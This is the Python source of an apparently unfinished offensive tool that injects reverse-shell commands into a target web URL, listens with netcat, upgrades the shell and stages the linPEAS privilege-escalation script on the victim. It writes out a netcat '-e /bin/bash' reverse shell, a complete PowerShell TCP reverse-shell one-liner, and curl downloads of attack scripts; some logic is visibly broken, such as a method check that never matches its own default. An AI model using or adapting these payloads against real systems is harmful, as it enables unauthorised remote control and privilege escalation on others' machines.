#!/usr/bin/env python3
#coding=utf-8
import netifaces
import base64
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import requests
import http.server
import socketserver


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = ''' 

     __    ____                _____ __         ____    __
   _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
  / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
 (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
/  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
/_/                                                /_/    

'''
print(banner)

def main():
	global args , default_ip , nc , port , ip , domain , method ,data , authentication , signal
	ip_address = netifaces.ifaddresses('lo')[2][0]['addr']
	################################# Arguments Creation ###########################################
	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('-H','--host',help='LOCAL IP ADDRESS',default=ip_address)
	parser.add_argument('-p','--port',help='LOCAL PORT NUMBER',type=int,default=9001)
	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,default='linux')
	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWNME]')
	parser.add_argument("-d","--data",help='Post data')
	parser.add_argument("-c","--cookie",help='Enter Cookie')
	parser.add_argument("-k","--header",help='Provide header')
	parser.add_argument("-m","--method",help='Request Method',default='POST')
	parser.add_argument("-a","--auth",help='[USERNAME PASSWORD]', nargs=2)
	args = parser.parse_args()
	########################################################################
	########################## Defining variables ##########################
	ip=ip_address
	ip=args.host
	port=args.port
	domain=args.url
	typ=args.type
	method=args.method
	data=args.data
	authentication=args.auth
	########################################################################
	###################### Specifying OS ###################################
	if args.type == "linux" or args.type == "l":
		shell_linux()
	elif args.type == "windows" or args.type == "w":
		shell_windows()
	else:
		print("[!]Invalid Value -> "+ args.type)
		exit_gracefully()
	######################################################################

def info():
	print('[*]LOCAL IP ADDRESS : %s'%ip)
	print('[*]LOCAL PORT : %s'%port)
	print('[*]TARGET URL : %s'%domain)
	if authentication:
		print('[*]USERNAME : %s'%authentication[0])
		print('[*]PASSWORD : %s'%authentication[1])
	print('\n#Waiting for a Connection ....')

def shell_windows():
	info()
	is_valid()
	thread()

def shell_linux():  #Default option
	info()
	#login()
	is_valid()
	thread() #leave it the last one


def is_valid():  #Checking if the ip address is valid
	try:
		ipaddress.ip_address(ip)
		return True
	except ValueError:
		print("\n[!]Invalid IP : "+ip)
		exit_gracefully()

def listener(): #setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
	nc = nclib.Netcat(listen=('', port),verbose=True)
	if typ == "linux" or typ == 'l':
		os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null')
		nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
		nc.send_line(b'echo $SHELL')
		send = f'''nc {ip} 9002 > /dev/shm/linpeas.sh'''
		nc.send_line(send.encode("utf-8"))
		nc.interact()
		nc.close()
	else:
		nc.interact()
		nc.close()


def http_server():
	Handler = http.server.SimpleHTTPRequestHandler
	with socketserver.TCPServer(("", 9002), Handler) as httpd:
		pass

def thread():
	listen=Thread(target=listener)
	sendpayload=Thread(target=send_payload)
	httpserver=Thread(target=http_server)
	listen.daemon=True
	sendpayload.daemon=True
	httpserver.daemon=True
	listen.start()
	sendpayload.start()
	httpserver.start()
	httpserver.join()
	listen.join()
	sendpayload.join()


def send_payload():
	if method == 'post':
		req_post()
	elif method == 'get':
		print('get method')
		req_get()
	else:
		return False

def req_post():
	if typ == "linux" or typ == 'l':
		payload=f'nc localhost 9001 -e /bin/bash'
		url = domain.replace('PWNME',payload) #payoad will be the revshells
		proxies={'http':'http://127.0.0.1:8080'}
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'} #Don't Change*
		cookies=''
		#data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
		r=requests.post(url)
	else:
		os.system("curl https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -o powercat.ps1")
		payload='''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''
		url = domain.replace('PWNME',payload) #payoad will be the revshells
		proxies={'http':'http://127.0.0.1:8080'}
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'} #Don't Change*
		cookies=''
		#data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
		r=requests.post(url)



def req_get():
	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
	cookies=''
	r=requests.get(url)

def login():
	pass

def exit_gracefully():
	print("                                   #GOOD BYE!")
	exit()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit_gracefully()


#TODO
#add payloads to a list or a dict for iteration
#see how to get the headers automatically and send them instead of writing them manually
#Add login form with a session
#Add customization for cookies & Headers
#Add the payload generator
#Add an exit message to break instead of errors
#Mandatory method
